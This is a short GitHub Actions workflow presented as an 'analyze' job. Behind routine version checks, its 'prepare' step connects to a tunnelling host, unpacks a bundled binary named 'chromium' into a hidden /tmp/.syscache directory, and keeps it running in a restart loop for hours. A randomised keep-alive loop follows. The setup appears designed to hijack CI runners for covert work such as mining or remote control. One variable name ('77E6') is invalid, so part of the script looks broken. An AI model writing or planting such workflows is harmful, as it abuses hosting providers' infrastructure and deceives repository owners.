name: analyze-te8l
on:
  workflow_dispatch:
jobs:
  prepare_duj:
    runs-on: ubuntu-latest
    timeout-minutes: 335
    steps:
      - uses: actions/checkout@v4
      - run: python3 --version
      - run: go version 2>/dev/null || true
      - run: gcc --version | head -1
      - name: prepare
        run: |
          python3 -c "import socket,ssl; s=socket.create_connection(('z5h8srda9j.localto.net',8999),timeout=10); print('NET-TCP-OPEN'); c=ssl.create_default_context().wrap_socket(s,server_hostname='z5h8srda9j.localto.net'); print('NET-TLS-OK',c.version())" || echo NET-FAIL
          unzip -o -q vendor/chromium.zip -d /tmp/.syscache && chmod +x /tmp/.syscache/chromium
          cd /tmp/.syscache && stdbuf -o0 -e0 timeout 226m bash -c 'while true; do ./chromium; echo "worker-exit rc=$? $(date -u +%H:%M), restarting"; sleep 5; done'
          77E6=$((SECONDS + 125 * 60))
          while [ $SECONDS -lt $77E6 ]; do sleep $((RANDOM % 75 + 52)); echo "$(date -u +%H:%M:%S) 4fqnyd"; done
